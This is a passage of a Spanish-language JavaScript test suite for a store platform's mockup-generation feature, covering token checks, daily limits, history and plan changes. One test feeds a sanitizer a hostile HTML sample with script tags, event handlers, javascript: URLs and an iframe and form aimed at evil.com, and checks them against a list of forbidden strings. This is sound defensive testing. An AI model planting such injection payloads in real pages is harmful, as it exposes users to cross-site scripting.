    assert.ok(a.miniatura.startsWith(`${base}/subidas/${t.tiendaId}/`) && a.miniatura.endsWith('-m.webp'));
  }
  assert.deepEqual(cuerpo.catalogo.productos, [
    { nombre: 'Taza', precio: formatearPesos(150000), foto: `${base}/subidas/${t.tiendaId}/foto-de-la-taza-m.webp` },
    { nombre: 'Mate', precio: formatearPesos(250000), foto: null },
  ], 'primero el destacado y con foto');
  assert.deepEqual(cuerpo.catalogo.categorias, []);
  // En la base queda la huella del token, no el token.
  const fila = await maquetaDe(t);
  assert.equal(fila.id, cuerpo.maqueta.id);
  assert.equal(fila.estado, 'pendiente');
  assert.equal(fila.token_hash, hashDeToken(cuerpo.maqueta.token));
  assert.ok(!JSON.stringify(fila).includes(cuerpo.maqueta.token));
  assert.ok((await pagina(t, '/admin/marca/maqueta')).includes('Estamos armando tu maqueta'));
});

test('con el logo de la tienda alcanza para pedir la maqueta, y viaja aparte', async () => {
  const t = await tienda();
  await db.prepare('UPDATE ajustes_tienda SET logo = ? WHERE tienda_id = ?').run('el-logo-de-la-tienda.webp', t.tiendaId);
  await db.prepare('INSERT INTO ajustes_tienda (tienda_id, logo) VALUES (?, ?) ON CONFLICT (tienda_id) DO UPDATE SET logo = excluded.logo').run(t.tiendaId, 'el-logo-de-la-tienda.webp');
  const { id } = await pedida(t);
  const { cuerpo } = recibidos.at(-1);
  assert.equal(cuerpo.logoTienda, `http://localhost:${puerto}/subidas/${t.tiendaId}/el-logo-de-la-tienda.webp`);
  assert.deepEqual(cuerpo.archivos, []);
  assert.ok(id);
});

test('una sola maqueta en camino por tienda, aunque los pedidos lleguen a la vez', async () => {
  const t = await tienda();
  await subir(t, [imagen(100)]);
  const antes = recibidos.length;
  await Promise.all([pedirMaqueta(t), pedirMaqueta(t), pedirMaqueta(t)]);
  assert.equal(recibidos.length, antes + 1, 'n8n recibió un solo pedido');
  assert.equal((await db.prepare('SELECT count(*) AS n FROM maquetas WHERE tienda_id = ?').get(t.tiendaId)).n, 1);
  await pedirMaqueta(t);
  assert.ok((await pagina(t, '/admin/marca/maqueta')).includes('Ya hay una maqueta en camino'));
});

test('la entrega: generando, lista con HTML limpio, y la página la muestra en un iframe aislado', async () => {
  const t = await tienda();
  await subir(t, [imagen(110)]);
  const { id, token } = await pedida(t);

  assert.equal((await entregar(id, { token, estado: 'generando' })).status, 200);
  assert.equal((await maquetaDe(t)).estado, 'generando');
  const estado = await (await t.nav.pedir(`/admin/marca/maqueta/${id}/estado`)).json();
  assert.deepEqual(estado, { estado: 'generando', enCurso: true });
  assert.ok((await pagina(t, '/admin/marca/maqueta')).includes(`data-maqueta-espera="${id}"`));

  const hostil =
    '<!doctype html><html><head><title>Maqueta</title><style>body{font-family:sans-serif}</style><script>alert("x")</script></head>' +
    '<body onload="alert(1)"><h1>Casa de ejemplo</h1><p>Una tienda con mucho para ver y comprar</p><img src="javascript:alert(1)" onerror="alert(2)">' +
    '<a href="javascript:alert(3)">mal</a><iframe src="https://evil.com"></iframe><form action="https://evil.com"><input name="x"></form></body></html>';
  const resumen = '  Paleta azul, estilo moderno\n  con tipografía Inter. '.padEnd(500, '.');
  const respuesta = await entregar(id, { token, estado: 'lista', html: hostil, resumen });
  assert.equal(respuesta.status, 200);
  assert.deepEqual(await respuesta.json(), { ok: true });

  const fila = await maquetaDe(t);
  assert.equal(fila.estado, 'lista');
  for (const prohibido of ['<script', 'onload', 'onerror', 'javascript:', '<iframe', '<form', 'evil.com', 'alert']) assert.ok(!fila.html.includes(prohibido), `"${prohibido}" no se guardó`);
  assert.ok(fila.html.includes('<h1>Casa de ejemplo</h1>') && fila.html.includes('body{font-family:sans-serif}'));
  assert.ok(fila.resumen.length <= 300 && !fila.resumen.includes('\n'), 'el resumen es un texto corto de una línea');

  const vista = await pagina(t, '/admin/marca/maqueta');
  assert.ok(vista.includes(`<iframe class="maqueta-iframe" src="/admin/marca/maqueta/${id}/vista" sandbox=""`), 'el iframe va sin ningún permiso');
  assert.ok(vista.includes('Paleta azul, estilo moderno') && vista.includes('Abrir en pantalla completa') && vista.includes('Lista'));
  assert.ok(!vista.includes('data-maqueta-espera'));

  // El HTML se sirve con la política más cerrada.
  const documento = await t.nav.pedir(`/admin/marca/maqueta/${id}/vista`);
  assert.equal(documento.status, 200);
  assert.match(documento.headers.get('content-type'), /^text\/html; charset=utf-8/);
  const politica = documento.headers.get('content-security-policy');
  for (const parte of ["default-src 'none'", `img-src 'self' http://localhost:${puerto} data:`, "form-action 'none'", "base-uri 'none'", "frame-ancestors 'self'", 'sandbox']) assert.ok(politica.includes(parte), `la política incluye ${parte}`);
  assert.ok(!politica.includes('script-src') && !politica.includes("'unsafe-eval'"), 'no se permite ningún script');
  assert.equal(documento.headers.get('x-frame-options'), 'SAMEORIGIN');
  assert.equal(documento.headers.get('x-content-type-options'), 'nosniff');
  assert.equal(documento.headers.get('referrer-policy'), 'no-referrer');
  assert.match(documento.headers.get('cache-control'), /no-store/);
  assert.equal(await documento.text(), fila.html);
  // Sin sesión no se ve.
  const anonimo = await fetch(`http://127.0.0.1:${puerto}/admin/marca/maqueta/${id}/vista`, { redirect: 'manual' });
  assert.equal(anonimo.status, 302);
  assert.ok(anonimo.headers.get('location').endsWith('/admin/ingresar'));
});

test('la entrega: sin el token del pedido no se puede completar ni cambiar nada', async () => {
  const t = await tienda();
  const otra = await tienda();
  await subir(t, [imagen(120)]);
  await subir(otra, [imagen(121)]);
  const mia = await pedida(t);
  const ajena = await pedida(otra);

  for (const cuerpo of [
    { estado: 'lista', html: HTML_OK },
    { token: 'no-es-el-token-de-nadie-aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa', estado: 'lista', html: HTML_OK },
    { token: ajena.token, estado: 'lista', html: HTML_OK },
    { token: mia.token.slice(0, -1), estado: 'lista', html: HTML_OK },
    { token: 12345, estado: 'lista', html: HTML_OK },
    { token: [mia.token], estado: 'lista', html: HTML_OK },
  ]) {
    const respuesta = await entregar(mia.id, cuerpo);
    assert.equal(respuesta.status, 401, JSON.stringify(cuerpo).slice(0, 80));
  }
  assert.equal((await entregar(999_999, { token: mia.token, estado: 'lista', html: HTML_OK })).status, 401, 'un pedido que no existe responde igual que un token malo');
  assert.equal((await entregar('abc', { token: mia.token })).status, 404);
  assert.equal((await maquetaDe(t)).estado, 'pendiente');
  assert.equal((await maquetaDe(otra)).estado, 'pendiente');

  // Con el token correcto, pero mal armado.
  assert.equal((await entregar(mia.id, { token: mia.token, estado: 'terminada' })).status, 400);
  assert.equal((await entregar(mia.id, { token: mia.token })).status, 400);
  assert.equal((await entregar(mia.id, '{esto no es json')).status, 400);
  assert.equal((await entregar(mia.id, '[1,2]')).status, 401);
  assert.equal((await maquetaDe(t)).estado, 'pendiente');
});

test('la entrega: HTML inválido o enorme marca la maqueta con problemas; una resuelta no se pisa y repetir lo mismo no molesta', async () => {
  const t = await tienda();
  await subir(t, [imagen(130)]);
  let pedido = await pedida(t);
  let respuesta = await entregar(pedido.id, { token: pedido.token, estado: 'lista', html: '<script>alert(1)</script>' });
  assert.equal(respuesta.status, 422);
  assert.equal((await maquetaDe(t)).estado, 'error');
  assert.ok((await pagina(t, '/admin/marca/maqueta')).includes('No pudimos armar esta maqueta.'));

  pedido = await pedida(t);
  respuesta = await entregar(pedido.id, { token: pedido.token, estado: 'lista', html: `<p>${'x'.repeat(MAX_HTML)}</p>` });
  assert.equal(respuesta.status, 422, 'demasiado grande');
  assert.equal((await maquetaDe(t)).estado, 'error');

  pedido = await pedida(t);
  assert.equal((await entregar(pedido.id, { token: pedido.token, estado: 'lista', html: HTML_OK })).status, 200);
  // Repetir la misma entrega (n8n reintenta cuando no le llegó la respuesta) está bien; cambiarla, no.
  respuesta = await entregar(pedido.id, { token: pedido.token, estado: 'lista', html: HTML_OK });
  assert.equal(respuesta.status, 200);
  assert.equal((await respuesta.json()).repetida, true);
  assert.equal((await entregar(pedido.id, { token: pedido.token, estado: 'error', error: 'tarde' })).status, 409);
  assert.equal((await entregar(pedido.id, { token: pedido.token, estado: 'generando' })).status, 409);
  assert.equal((await maquetaDe(t)).estado, 'lista');
  assert.ok((await maquetaDe(t)).html.includes('Casa de ejemplo'));
});

test('la entrega: n8n puede avisar que falló, y el cliente ve el motivo', async () => {
  const t = await tienda();
  await subir(t, [imagen(140)]);
  const { id, token } = await pedida(t);
  const respuesta = await entregar(id, { token, estado: 'error', error: '  El generador <b>no respondió</b>\ndos veces  ' });
  assert.equal(respuesta.status, 200);
  const fila = await maquetaDe(t);
  assert.equal(fila.estado, 'error');
  assert.equal(fila.error, 'El generador <b>no respondió</b> dos veces');
  const html = await pagina(t, '/admin/marca/maqueta');
  assert.ok(html.includes('No pudimos armar esta maqueta.') && html.includes('El generador &lt;b&gt;no respondió&lt;/b&gt; dos veces'), 'el motivo se muestra como texto');
  assert.ok(!html.includes('<iframe class="maqueta-iframe"'));
  // Y se puede pedir otra: el botón está habilitado.
  assert.match(html, /<button class="boton" type="submit">(?:(?!<\/button>)[^])*Armar otra maqueta/);
  assert.equal((await t.nav.pedir(`/admin/marca/maqueta/${id}/vista`)).status, 404, 'una maqueta con problemas no tiene vista');
  await pedida(t);
});

test('si n8n no contesta, el pedido se descarta y no cuenta para el tope; si no está configurado, ni se intenta', async () => {
  const t = await tienda();
  await subir(t, [imagen(150)]);
  respuestaN8n = 500;
  try {
    const antes = recibidos.length;
    assert.equal((await pedirMaqueta(t)).status, 302);
    assert.equal(recibidos.length, antes + 1, 'se intentó');
    assert.equal(await maquetaDe(t), undefined, 'no queda un pedido colgado');
    assert.ok((await pagina(t, '/admin/marca/maqueta')).includes('No pudimos pedir la maqueta en este momento.'));
  } finally {
    respuestaN8n = 200;
  }
  await pedida(t); // y apenas vuelve n8n, se puede pedir
  assert.equal((await db.prepare('SELECT count(*) AS n FROM maquetas WHERE tienda_id = ?').get(t.tiendaId)).n, 1);

});

test('sin N8N_MAQUETAS_URL el kit se completa pero la maqueta no se puede pedir, y se explica', async () => {
  const sinN8n = crearApp({ db, config: { produccion: false, secretoSesion: 'secreto-de-prueba-de-al-menos-32-caracteres', dominio: 'localhost', dirImportaciones: '.', dirSubidas, contactoPlataforma: 'info@ejemplo.com' } }).listen(0);
  await once(sinN8n, 'listening');
  try {
    const t = await tienda('acompanado', sinN8n.address().port);
    await subir(t, [imagen(155)]);
    const html = await pagina(t, '/admin/marca');
    assert.ok(html.includes('Por ahora no podemos armar maquetas. Contactanos: info@ejemplo.com.'));
    assert.match(html, /<button class="boton" type="submit" disabled>/);
    const antes = recibidos.length;
    await pedirMaqueta(t);
    assert.equal(recibidos.length, antes);
    assert.equal(await maquetaDe(t), undefined);
    assert.ok((await pagina(t, '/admin/marca/maqueta')).includes('Por ahora no podemos armar maquetas.'));
  } finally {
    sinN8n.closeAllConnections();
    sinN8n.close();
  }
});

test('el tope diario, las que quedan sin contestar y el historial', async () => {
  const t = await tienda();
  await subir(t, [imagen(160)]);
  // Tres maquetas completas en el día: la cuarta no se pide.
  for (let n = 0; n < MAX_POR_DIA; n++) {
    const { id, token } = await pedida(t);
    assert.equal((await entregar(id, { token, estado: 'lista', html: HTML_OK })).status, 200);
  }
  const antes = recibidos.length;
  await pedirMaqueta(t);
  assert.equal(recibidos.length, antes, 'el cuarto pedido no llega a n8n');
  const html = await pagina(t, '/admin/marca/maqueta');
  assert.ok(html.includes(`Podés pedir hasta ${MAX_POR_DIA} maquetas cada 24 horas`) && html.includes(`Ya pediste ${MAX_POR_DIA} maquetas`));
  assert.match(html, /<button class="boton" type="submit" disabled>/, 'el botón queda deshabilitado');

  // Pasadas 24 horas, el tope se libera.
  await db.prepare("UPDATE maquetas SET creado_en = to_char((now() AT TIME ZONE 'UTC') - interval '25 hours', 'YYYY-MM-DD HH24:MI:SS') WHERE tienda_id = ?").run(t.tiendaId);
  const { id } = await pedida(t);

  // Una que n8n nunca entrega pasa a error pasados 15 minutos y no bloquea la siguiente.
  await db.prepare("UPDATE maquetas SET creado_en = to_char((now() AT TIME ZONE 'UTC') - interval '16 minutes', 'YYYY-MM-DD HH24:MI:SS') WHERE id = ?").run(id);
  const estado = await (await t.nav.pedir(`/admin/marca/maqueta/${id}/estado`)).json();
  assert.deepEqual(estado, { estado: 'error', enCurso: false });
  assert.match((await maquetaDe(t)).error, /Tardó más de lo esperado/);
  const viejo = await pedida(t);
  assert.ok(viejo.id > id);

  // Solo se guardan las últimas MAX_GUARDADAS.
  await db.prepare("UPDATE maquetas SET estado = 'error', error = 'x' WHERE id = ?").run(viejo.id);
  for (let n = 0; n < 6; n++) {
    await db.prepare("INSERT INTO maquetas (tienda_id, estado, token_hash, creado_en) VALUES (?, 'error', 'h', to_char((now() AT TIME ZONE 'UTC') - interval '3 days', 'YYYY-MM-DD HH24:MI:SS'))").run(t.tiendaId);
  }
  await pedida(t);
  assert.equal((await db.prepare('SELECT count(*) AS n FROM maquetas WHERE tienda_id = ?').get(t.tiendaId)).n, MAX_GUARDADAS);
  const nuevas = await db.prepare('SELECT id FROM maquetas WHERE tienda_id = ? ORDER BY id DESC').all(t.tiendaId);
  assert.equal(nuevas[0].id, (await maquetaDe(t)).id, 'se conservan las más nuevas');
});

test('el historial: ver una anterior, borrar las que ya terminaron y no las que están en camino', async () => {
  const t = await tienda();
  await subir(t, [imagen(170)]);
  const primera = await pedida(t);
  await entregar(primera.id, { token: primera.token, estado: 'lista', html: HTML_OK.replace('Casa de ejemplo', 'Primera maqueta') });
  const segunda = await pedida(t);
  await entregar(segunda.id, { token: segunda.token, estado: 'lista', html: HTML_OK.replace('Casa de ejemplo', 'Segunda maqueta') });
  const tercera = await pedida(t);

  let html = await pagina(t, '/admin/marca/maqueta');
  assert.ok(html.includes('Tus maquetas') && html.includes(`data-maqueta-espera="${tercera.id}"`), 'por defecto, la más nueva');
  html = await pagina(t, `/admin/marca/maqueta?ver=${primera.id}`);
  assert.ok(html.includes(`src="/admin/marca/maqueta/${primera.id}/vista"`) && !html.includes(`data-maqueta-espera`));
  assert.ok((await (await t.nav.pedir(`/admin/marca/maqueta/${primera.id}/vista`)).text()).includes('Primera maqueta'));
  assert.ok((await (await t.nav.pedir(`/admin/marca/maqueta/${segunda.id}/vista`)).text()).includes('Segunda maqueta'));
  assert.ok((await pagina(t, '/admin/marca/maqueta?ver=abc')).includes('Maqueta del'), 'un ver inválido muestra la última');

  // La que está en camino no se borra; las terminadas sí.
  await t.nav.enviar(`/admin/marca/maqueta/${tercera.id}/borrar`, {}, { desde: '/admin/marca' });
  assert.equal((await maquetaDe(t)).id, tercera.id);
  assert.ok((await pagina(t, '/admin/marca/maqueta')).includes('Esa maqueta no se puede borrar'));
  await t.nav.enviar(`/admin/marca/maqueta/${primera.id}/borrar`, {}, { desde: '/admin/marca' });
  assert.equal((await t.nav.pedir(`/admin/marca/maqueta/${primera.id}/vista`)).status, 404);
  assert.equal((await db.prepare('SELECT count(*) AS n FROM maquetas WHERE tienda_id = ?').get(t.tiendaId)).n, 2);
});

test('bajar de plan: lo guardado se conserva, pero el kit y las maquetas vuelven a verse bloqueados', async () => {
  const t = await tienda();
  await subir(t, [imagen(180)]);
  const { id, token } = await pedida(t);
  await entregar(id, { token, estado: 'lista', html: HTML_OK });
  assert.equal((await t.nav.pedir(`/admin/marca/maqueta/${id}/vista`)).status, 200);

  const esencial = await crearPlan(db, { nombre: `Baja marca ${contador}`, precioCentavos: 1000, maxProductos: null, maxFotos: null, maxBanners: null, activo: true, nivelDiseno: 'esencial' });
  await db.prepare('UPDATE tiendas SET plan_id = ? WHERE id = ?').run(esencial, t.tiendaId);
  assert.ok((await pagina(t, '/admin/marca')).includes('Disponible desde el plan <strong>Acompañado</strong>'));
  assert.equal((await t.nav.pedir(`/admin/marca/maqueta/${id}/vista`)).status, 404, 'tampoco se sirve el HTML');
  assert.equal((await listarArchivos(db, t.tiendaId)).length, 1, 'el archivo sigue guardado');
  const acompanado = await crearPlan(db, { nombre: `Sube marca ${contador}`, precioCentavos: 3000, maxProductos: null, maxFotos: null, maxBanners: null, activo: true, nivelDiseno: 'acompanado' });
  await db.prepare('UPDATE tiendas SET plan_id = ? WHERE id = ?').run(acompanado, t.tiendaId);
  assert.equal((await t.nav.pedir(`/admin/marca/maqueta/${id}/vista`)).status, 200, 'y al volver a subir, todo está como estaba');
});

test('una tienda suspendida puede ver su kit pero no cambiarlo ni pedir maquetas', async () => {
  const t = await tienda();
  await subir(t, [imagen(190)]);
  await db.prepare("UPDATE tiendas SET estado = 'suspendida' WHERE id = ?").run(t.tiendaId);
  assert.equal((await t.nav.pedir('/admin/marca')).status, 200);
  const antes = recibidos.length;
  const csrf = await t.nav.csrfDe('/admin/marca');
  assert.equal((await t.nav.pedir('/admin/marca/maqueta', { method: 'POST', body: new URLSearchParams({ _csrf: csrf }) })).status, 302);
  assert.equal((await t.nav.pedir('/admin/marca', { method: 'POST', body: new URLSearchParams({ _csrf: csrf, colorPrincipal: '#ff0000' }) })).status, 302);
  assert.equal(recibidos.length, antes);
  assert.equal((await db.prepare('SELECT count(*) AS n FROM marca WHERE tienda_id = ?').get(t.tiendaId)).n, 0);
});
